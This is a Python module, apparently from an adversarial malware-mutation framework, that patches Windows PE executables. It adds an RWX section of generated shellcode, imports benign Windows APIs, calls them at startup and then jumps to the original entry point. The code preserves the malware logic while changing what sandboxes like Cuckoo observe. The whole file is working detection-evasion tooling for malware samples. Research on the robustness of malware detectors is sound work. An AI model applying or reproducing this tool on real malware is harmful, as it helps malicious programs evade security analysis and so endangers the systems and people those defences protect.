"""
inject_call.py — Pure Python injection of benign API calls into PE execution flow.

Action: inject_benign_api_call (Tier 2)
Pipeline:
  1. Parse PE -> arch (x86/x64), original entry point (OEP), imagebase.
  2. Pick K random benign APIs from a curated SAFE_INJECT_APIS pool
     (each entry has a known-safe argument signature).
  3. Add those APIs to the import table via LIEF.
  4. Add a new RWX section ('.text2' / '.rdata2' / ...) with placeholder bytes.
  5. Re-query the IAT RVAs from the rebuilt PE.
  6. Build position-aware shellcode that:
        prologue
        for each API:
            load args (buffer pointer or zero)
            call [IAT]
        epilogue
        jmp rel32 -> OEP
        <dummy 256-byte buffer>
     x64: RIP-relative addressing -> no relocations needed.
     x86: PIC trick (push ebx; call $+5; pop ebx) -> all addresses computed
          at runtime from EBX, also no relocations needed.
  7. Overwrite the section's raw bytes in-place with the real shellcode.
  8. Patch OPTIONAL_HEADER.AddressOfEntryPoint to point to the new section.

Effect:
  When the PE runs, the new section executes first, calling 3-5 benign Windows
  APIs (GetSystemTime, GetTickCount, GetCursorPos, ...) before transferring
  control to the original entry point. The original malware logic is preserved
  unchanged. This adds dynamic API calls visible to sandboxes (Cuckoo / CAPE)
  without altering pre-existing static call-site relationships.
"""

import array
import random
import struct

import lief
import pefile

# ──────────────────────────────────────────────────────────────────────────────
# PE section characteristic flags (Microsoft PE spec — stable forever).
# Defined as raw integers to be compatible with all LIEF versions.
# LIEF 0.12.x exposes these as `lief.PE.SECTION_CHARACTERISTICS.*`,
# while LIEF 0.16.x exposes them as `lief.PE.Section.CHARACTERISTICS.*`.
# Using raw ints sidesteps the API split entirely.
# ──────────────────────────────────────────────────────────────────────────────
_SCN_CNT_CODE       = 0x00000020
_SCN_MEM_EXECUTE    = 0x20000000
_SCN_MEM_READ       = 0x40000000
_SCN_MEM_WRITE      = 0x80000000
_SCN_RWX            = _SCN_CNT_CODE | _SCN_MEM_EXECUTE | _SCN_MEM_READ | _SCN_MEM_WRITE


# ──────────────────────────────────────────────────────────────────────────────
# Section name candidates (benign-looking, tried in order).
# ──────────────────────────────────────────────────────────────────────────────
_INJECT_SECTION_NAMES = [
    '.text2', '.rdata2', '.data2', '.rsrc2', '.reloc2',
    '.ext0', '.tls0', '.in0',
]

# x86 DLLs known to be 100% stdcall (callee cleans stack).
# Pushing extra zero-args is safe ONLY for stdcall — cdecl APIs would corrupt
# the stack across calls.
_X86_SAFE_DLLS = {
    "KERNEL32.DLL", "USER32.DLL", "ADVAPI32.DLL", "GDI32.DLL",
    "OLE32.DLL",    "OLEAUT32.DLL", "VERSION.DLL", "WS2_32.DLL",
    "SHELL32.DLL",  "COMCTL32.DLL", "COMDLG32.DLL", "CRYPT32.DLL",
}

# ──────────────────────────────────────────────────────────────────────────────
# Curated pool of benign APIs with known-safe argument signatures.
# Format: (DLL, FUNC_NAME, [arg_types]) where arg_types ∈ {'buf', 'zero'}.
#   'buf'  → pointer to a 256-byte zeroed dummy buffer in our section
#   'zero' → integer/handle = 0
# All APIs in this pool are tolerant of these arguments (they may return
# error codes but will not crash the process).
# Constraint: max 4 args (so they fit in x64 register-based calling conv).
# ──────────────────────────────────────────────────────────────────────────────
SAFE_INJECT_APIS = [
    # ── Time / system info (KERNEL32, all stdcall) ───────────────────────
    ("KERNEL32.DLL", "GetSystemTime",             ['buf']),     # LPSYSTEMTIME (16 bytes)
    ("KERNEL32.DLL", "GetLocalTime",              ['buf']),
    ("KERNEL32.DLL", "GetSystemTimeAsFileTime",   ['buf']),     # LPFILETIME (8 bytes)
    ("KERNEL32.DLL", "GetTickCount",              []),
    ("KERNEL32.DLL", "GetTickCount64",            []),
    ("KERNEL32.DLL", "GetCurrentProcessId",       []),
    ("KERNEL32.DLL", "GetCurrentThreadId",        []),
    ("KERNEL32.DLL", "GetCurrentProcess",         []),
    ("KERNEL32.DLL", "GetCurrentThread",          []),
    ("KERNEL32.DLL", "GetCommandLineA",           []),
    ("KERNEL32.DLL", "GetCommandLineW",           []),
    ("KERNEL32.DLL", "GetVersion",                []),
    ("KERNEL32.DLL", "GetLastError",              []),
    ("KERNEL32.DLL", "QueryPerformanceCounter",   ['buf']),     # LARGE_INTEGER*
    ("KERNEL32.DLL", "QueryPerformanceFrequency", ['buf']),
    ("KERNEL32.DLL", "GetSystemInfo",             ['buf']),     # LPSYSTEM_INFO (~36 bytes)
    ("KERNEL32.DLL", "GetNativeSystemInfo",       ['buf']),
    ("KERNEL32.DLL", "GetStartupInfoA",           ['buf']),
    ("KERNEL32.DLL", "GetStartupInfoW",           ['buf']),
    ("KERNEL32.DLL", "GetProcessHeap",            []),
    ("KERNEL32.DLL", "GetEnvironmentStringsA",    []),
    ("KERNEL32.DLL", "GetEnvironmentStringsW",    []),

    # ── USER32 — info functions (stdcall) ────────────────────────────────
    ("USER32.DLL",   "GetCursorPos",              ['buf']),     # LPPOINT (8 bytes)
    ("USER32.DLL",   "GetMessagePos",             []),
    ("USER32.DLL",   "GetMessageTime",            []),
    ("USER32.DLL",   "GetActiveWindow",           []),
    ("USER32.DLL",   "GetForegroundWindow",       []),
    ("USER32.DLL",   "GetDesktopWindow",          []),
    ("USER32.DLL",   "GetDoubleClickTime",        []),
    ("USER32.DLL",   "GetSysColor",               ['zero']),    # int -> COLORREF
]

# Size of dummy zero buffer placed at the end of the injected section.
# Must be >= the largest output structure we feed to APIs (STARTUPINFO ~104B).
_DUMMY_BUF_SIZE = 256

_X64_MAGIC = 0x20b


# ──────────────────────────────────────────────────────────────────────────────
# API selection
# ──────────────────────────────────────────────────────────────────────────────

def _pick_apis(k=None, arch_is_64=True, rng=None):
    """Pick k random APIs from SAFE_INJECT_APIS, filtered by architecture.

    For x86 we only allow DLLs in _X86_SAFE_DLLS (all-stdcall).
    Returns list of (dll, func, arg_types). May return fewer than k entries.
    """
    if rng is None:
        rng = random
    if k is None:
        k = rng.randint(3, 5)

    pool = SAFE_INJECT_APIS
    if not arch_is_64:
        pool = [a for a in pool if a[0].upper() in _X86_SAFE_DLLS]

    if not pool:
        return []
    k = min(k, len(pool))
    return rng.sample(pool, k)


# ──────────────────────────────────────────────────────────────────────────────
# PE helpers
# ──────────────────────────────────────────────────────────────────────────────

def _open_pe(bytez):
    try:
        return pefile.PE(data=bytez, fast_load=False)
    except Exception:
        return None


def _query_iat_rvas(bytez, api_set_upper):
    """Return ({(dll_upper, func): iat_rva}, imagebase) for every requested API."""
    pe = _open_pe(bytez)
    if pe is None:
        return None, None
    imagebase = pe.OPTIONAL_HEADER.ImageBase
    iat_map = {}
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            try:
                dll_u = entry.dll.decode('ascii', errors='replace').upper()
            except Exception:
                continue
            for imp in entry.imports:
                if not imp.name:
                    continue
                try:
                    name = imp.name.decode('ascii', errors='replace')
                except Exception:
                    continue
                if (dll_u, name) in api_set_upper:
                    iat_map[(dll_u, name)] = imp.address - imagebase
    pe.close()
    return iat_map, imagebase


def _ensure_imports(bytez, apis):
    """Ensure each (dll, func) is present in the import table.

    Returns (new_bytez, iat_map) where iat_map = {(dll_upper, func): iat_rva}
    covering every requested API; or (bytez, None) on failure.
    """
    needed = {(d.upper(), f) for d, f, _ in apis}
    iat_map, _ = _query_iat_rvas(bytez, needed)
    if iat_map is None:
        return bytez, None

    missing = [(d, f) for d, f, _ in apis if (d.upper(), f) not in iat_map]
    if not missing:
        return bytez, iat_map

    try:
        binary = lief.PE.parse(list(bytez))
        if binary is None:
            return bytez, None

        # Build a case-insensitive lookup of existing libs
        existing_libs = {imp.name.upper(): imp.name for imp in binary.imports}

        for dll, func in missing:
            dll_u = dll.upper()
            if dll_u in existing_libs:
                lib_name_in_pe = existing_libs[dll_u]
            else:
                binary.add_library(dll)
                lib_name_in_pe = dll
                existing_libs[dll_u] = dll
            binary.add_import_function(lib_name_in_pe, func)

        builder = lief.PE.Builder(binary)
        builder.build_imports(True)
        builder.build()
        new_bytez = bytes(array.array("B", builder.get_build()))

        iat_map, _ = _query_iat_rvas(new_bytez, needed)
        if iat_map is None:
            return bytez, None
        for d, f, _ in apis:
            if (d.upper(), f) not in iat_map:
                return bytez, None
        return new_bytez, iat_map
    except Exception:
        return bytez, None


# ──────────────────────────────────────────────────────────────────────────────
# Section / entry-point manipulation
# ──────────────────────────────────────────────────────────────────────────────

def _add_section_rwx(bytez, content, name_candidates=None):
    """Append a new RWX section. Returns (new_bytez, sec_rva) or (bytez, None)."""
    if name_candidates is None:
        name_candidates = _INJECT_SECTION_NAMES
    try:
        binary = lief.PE.parse(list(bytez))
        if binary is None:
            return bytez, None
        existing = {s.name for s in binary.sections}
        name = next((n for n in name_candidates if n not in existing), '.in0')

        sec = lief.PE.Section(name)
        sec.content = list(content)
        sec.characteristics = _SCN_RWX
        added = binary.add_section(sec)
        rva = added.virtual_address

        builder = lief.PE.Builder(binary)
        builder.build()
        new_bytez = bytes(array.array("B", builder.get_build()))
        return new_bytez, rva
    except Exception:
        return bytez, None


def _overwrite_section_at_rva(bytez, sec_rva, code):
    """Replace raw bytes of the section starting at sec_rva with `code`."""
    pe = _open_pe(bytez)
    if pe is None:
        return bytez
    file_off = None
    raw_size = 0
    for section in pe.sections:
        if section.VirtualAddress == sec_rva:
            file_off = section.PointerToRawData
            raw_size = section.SizeOfRawData
            break
    pe.close()
    if file_off is None or raw_size < len(code):
        return bytez
    buf = bytearray(bytez)
    buf[file_off:file_off + len(code)] = code
    return bytes(buf)


def _patch_entry_point(bytez, new_ep_rva):
    """Patch OptionalHeader.AddressOfEntryPoint in place (4 bytes)."""
    pe = _open_pe(bytez)
    if pe is None:
        return bytez
    e_lfanew = pe.DOS_HEADER.e_lfanew
    pe.close()
    # PE signature (4) + COFF FileHeader (20) + OptionalHeader.AddressOfEntryPoint
    # at offset 0x10 (same for PE32 and PE32+ per Microsoft spec).
    ep_field_off = e_lfanew + 4 + 20 + 0x10
    if ep_field_off + 4 > len(bytez):
        return bytez
    buf = bytearray(bytez)
    struct.pack_into('<I', buf, ep_field_off, new_ep_rva & 0xFFFFFFFF)
    return bytes(buf)


# ──────────────────────────────────────────────────────────────────────────────
# Shellcode generators
# ──────────────────────────────────────────────────────────────────────────────

# x64 LEA opcodes for `lea reg, [rip+disp32]` (3-byte prefixes)
_X64_LEA_PREFIX = [
    b'\x48\x8D\x0D',   # lea rcx, [rip+disp32]
    b'\x48\x8D\x15',   # lea rdx, [rip+disp32]
    b'\x4C\x8D\x05',   # lea r8,  [rip+disp32]
    b'\x4C\x8D\x0D',   # lea r9,  [rip+disp32]
]

# x64 XOR for zeroing 32-bit halves (clears upper 32 bits of r64 too)
_X64_XOR_ZERO = [
    b'\x31\xC9',          # xor ecx, ecx
    b'\x31\xD2',          # xor edx, edx
    b'\x45\x31\xC0',      # xor r8d, r8d
    b'\x45\x31\xC9',      # xor r9d, r9d
]


def _x64_per_api_size(args):
    """Bytes consumed by code for one API call (x64), regs-only (≤4 args)."""
    s = 0
    for i, a in enumerate(args[:4]):
        s += 7 if a == 'buf' else len(_X64_XOR_ZERO[i])
    s += 6  # call qword ptr [rip+disp32]
    return s


def _x86_per_api_size(args):
    """Bytes consumed by code for one API call (x86, PIC mode).

    For each arg:
       'buf'  -> lea eax, [ebx+disp32]; push eax    (7 bytes: 8D 83 dd dd dd dd, 50)
       'zero' -> push 0                             (2 bytes: 6A 00)
    Then:
       mov edx, ebx                                  (2 bytes: 89 DA)
       add edx, imm32                                (6 bytes: 81 C2 dd dd dd dd)
       call [edx]                                    (2 bytes: FF 12)
    """
    s = 0
    for a in args:
        s += 7 if a == 'buf' else 2
    s += 2 + 6 + 2
    return s


def _calc_section_size(apis, is64):
    """Total section size = code + dummy buffer (16-byte aligned)."""
    if is64:
        prologue = 4               # sub rsp, 0x28
        epilogue = 4 + 5           # add rsp, 0x28; jmp rel32
        per = _x64_per_api_size
    else:
        prologue = 1 + 5 + 1       # push ebx; call $+5; pop ebx
        epilogue = 1 + 5           # pop ebx; jmp rel32
        per = _x86_per_api_size

    code = prologue + sum(per(a[2]) for a in apis) + epilogue
    total = code + _DUMMY_BUF_SIZE
    return (total + 15) & ~15      # round up to 16


def _make_injection_x64(apis, iat_map, oep_rva, sec_rva):
    """Build x64 shellcode. Returns (bytes, total_size) or (None, 0)."""
    # Compute layout
    prologue_size = 4
    body_size = sum(_x64_per_api_size(a[2]) for a in apis)
    epilogue_size = 4 + 5
    code_size = prologue_size + body_size + epilogue_size
    buf_off = code_size
    total_size = (code_size + _DUMMY_BUF_SIZE + 15) & ~15

    out = bytearray(total_size)

    # Prologue: sub rsp, 0x28
    out[0:4] = b'\x48\x83\xEC\x28'
    cur = 4

    for dll, func, args in apis:
        iat_rva = iat_map.get((dll.upper(), func))
        if iat_rva is None:
            return None, 0

        # Argument loading (≤4 args)
        for i, atype in enumerate(args[:4]):
            if atype == 'buf':
                # lea reg, [rip+disp32]; disp = (sec_rva + buf_off) - (sec_rva + cur + 7)
                #                            = buf_off - cur - 7
                disp = buf_off - cur - 7
                out[cur:cur + 3] = _X64_LEA_PREFIX[i]
                struct.pack_into('<i', out, cur + 3, disp)
                cur += 7
            else:
                xor_bytes = _X64_XOR_ZERO[i]
                out[cur:cur + len(xor_bytes)] = xor_bytes
                cur += len(xor_bytes)

        # call qword ptr [rip+disp32]
        # next_ip = sec_rva + cur + 6
        # disp = iat_rva - (sec_rva + cur + 6)
        disp = iat_rva - (sec_rva + cur + 6)
        out[cur:cur + 2] = b'\xFF\x15'
        struct.pack_into('<i', out, cur + 2, disp)
        cur += 6

    # Epilogue: add rsp, 0x28
    out[cur:cur + 4] = b'\x48\x83\xC4\x28'
    cur += 4

    # jmp rel32 -> oep_rva
    # next_ip = sec_rva + cur + 5
    disp = oep_rva - (sec_rva + cur + 5)
    out[cur] = 0xE9
    struct.pack_into('<i', out, cur + 1, disp)
    cur += 5

    # Tail: dummy buffer remains zeroed (already zero in bytearray)
    assert cur == code_size, f"x64 code size mismatch: {cur} vs {code_size}"
    return bytes(out), total_size


def _make_injection_x86(apis, iat_map, imagebase, oep_rva, sec_rva):
    """Build x86 PIC shellcode. Returns (bytes, total_size) or (None, 0).

    PIC base technique:
       0:  push ebx                  (53)         save caller's EBX (callee-saved)
       1:  call $+5                  (E8 00*4)   pushes sec_va+6, jumps to offset 6
       6:  pop ebx                   (5B)         EBX = sec_va+6 = imagebase+sec_rva+6

    All addresses inside the section computed from EBX:
       any_va = EBX + (target_offset_in_section - 6)
       any_iat_va = EBX + (iat_rva - sec_rva - 6)

    For each 'buf' arg:
       lea eax, [ebx + (buf_off - 6)]    (8D 83 dd dd dd dd)   6 bytes
       push eax                          (50)                  1 byte (total 7)
       (we use 8 in size calc for safety/alignment? actually 7;
        but we standardize on 8 by using same encoding. Actually 7 is correct.)

    For each 'zero' arg:
       push 0                            (6A 00)               2 bytes

    Then call [IAT]:
       mov edx, ebx                     (89 DA)               2 bytes
       add edx, imm32                   (81 C2 dd dd dd dd)   6 bytes
       call [edx]                       (FF 12)               2 bytes
    """
    prologue_size = 1 + 5 + 1  # push ebx; call $+5; pop ebx
    body_size = sum(_x86_per_api_size(a[2]) for a in apis)
    epilogue_size = 1 + 5      # pop ebx; jmp rel32
    code_size = prologue_size + body_size + epilogue_size
    buf_off = code_size
    total_size = (code_size + _DUMMY_BUF_SIZE + 15) & ~15

    out = bytearray(total_size)

    # Prologue
    out[0] = 0x53                                   # push ebx
    out[1:6] = b'\xE8\x00\x00\x00\x00'              # call $+5
    out[6] = 0x5B                                   # pop ebx — EBX = sec_va+6
    cur = 7

    # PIC base: at runtime EBX = imagebase + sec_rva + 6
    # All [ebx + disp] references compute target_va = EBX + disp
    # We want target_va = imagebase + target_rva, so disp = target_rva - sec_rva - 6.

    for dll, func, args in apis:
        iat_rva = iat_map.get((dll.upper(), func))
        if iat_rva is None:
            return None, 0

        for atype in args:
            if atype == 'buf':
                # lea eax, [ebx + (buf_va - (imagebase + sec_rva + 6))]
                # buf_va = imagebase + sec_rva + buf_off
                # disp   = buf_off - 6
                disp = buf_off - 6
                out[cur:cur + 2] = b'\x8D\x83'
                struct.pack_into('<i', out, cur + 2, disp)
                out[cur + 6] = 0x50                # push eax
                cur += 7
            else:
                out[cur:cur + 2] = b'\x6A\x00'      # push 0
                cur += 2

        # mov edx, ebx
        out[cur:cur + 2] = b'\x89\xDA'
        cur += 2
        # add edx, (iat_rva - sec_rva - 6)
        disp = iat_rva - sec_rva - 6
        out[cur:cur + 2] = b'\x81\xC2'
        struct.pack_into('<i', out, cur + 2, disp)
        cur += 6
        # call [edx]
        out[cur:cur + 2] = b'\xFF\x12'
        cur += 2

    # Epilogue
    out[cur] = 0x5B                                 # pop ebx — restore caller's EBX
    cur += 1

    # jmp rel32 -> oep_rva
    # next_ip = sec_va + cur + 5; disp = (imagebase+oep_rva) - (sec_va+cur+5)
    #        = oep_rva - sec_rva - cur - 5
    disp = oep_rva - sec_rva - cur - 5
    out[cur] = 0xE9
    struct.pack_into('<i', out, cur + 1, disp)
    cur += 5

    assert cur == code_size, f"x86 code size mismatch: {cur} vs {code_size}"
    return bytes(out), total_size


# ──────────────────────────────────────────────────────────────────────────────
# Public entry point
# ──────────────────────────────────────────────────────────────────────────────

def inject_benign_api_call(bytez, num_apis=None, rng=None):
    """Inject K benign API calls before the original entry point.

    Args:
        bytez:    PE bytes.
        num_apis: number of APIs to inject (default random 3-5).
        rng:      optional random.Random instance for reproducibility.

    Returns:
        Modified bytes, or original bytes if any step fails.
    """
    pe = _open_pe(bytez)
    if pe is None:
        return bytez
    is64 = pe.OPTIONAL_HEADER.Magic == _X64_MAGIC
    machine = pe.FILE_HEADER.Machine
    oep_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    pe.close()

    # Only handle x86 (0x14c) and x64 (0x8664). Reject ARM, ARM64, etc.
    if machine not in (0x14c, 0x8664):
        return bytez
    if oep_rva == 0:
        return bytez

    apis = _pick_apis(k=num_apis, arch_is_64=is64, rng=rng)
    if len(apis) < 1:
        return bytez

    # Step 1: ensure imports
    working, iat_map = _ensure_imports(bytez, apis)
    if iat_map is None:
        return bytez

    # Re-read OEP from the rebuilt PE — LIEF may have shifted things
    pe2 = _open_pe(working)
    if pe2 is None:
        return bytez
    oep_rva = pe2.OPTIONAL_HEADER.AddressOfEntryPoint
    imagebase = pe2.OPTIONAL_HEADER.ImageBase
    pe2.close()

    # Step 2: add a placeholder section sized to fit code + buffer
    section_size = _calc_section_size(apis, is64)
    placeholder = b'\x00' * section_size
    working, sec_rva = _add_section_rwx(working, placeholder)
    if sec_rva is None:
        return bytez

    # Step 3: re-query IAT RVAs from the post-section PE
    needed = {(d.upper(), f) for d, f, _ in apis}
    iat_map, imagebase = _query_iat_rvas(working, needed)
    if iat_map is None:
        return bytez
    for d, f, _ in apis:
        if (d.upper(), f) not in iat_map:
            return bytez

    # Re-read OEP from the now-final PE structure
    pe3 = _open_pe(working)
    if pe3 is None:
        return bytez
    oep_rva = pe3.OPTIONAL_HEADER.AddressOfEntryPoint
    pe3.close()

    # Step 4: build real shellcode
    if is64:
        code, _csize = _make_injection_x64(apis, iat_map, oep_rva, sec_rva)
    else:
        code, _csize = _make_injection_x86(apis, iat_map, imagebase, oep_rva, sec_rva)
    if code is None or len(code) > section_size:
        return bytez

    # Step 5: overwrite the placeholder section with real shellcode
    working = _overwrite_section_at_rva(working, sec_rva, code)

    # Step 6: patch entry point
    working = _patch_entry_point(working, sec_rva)

    return working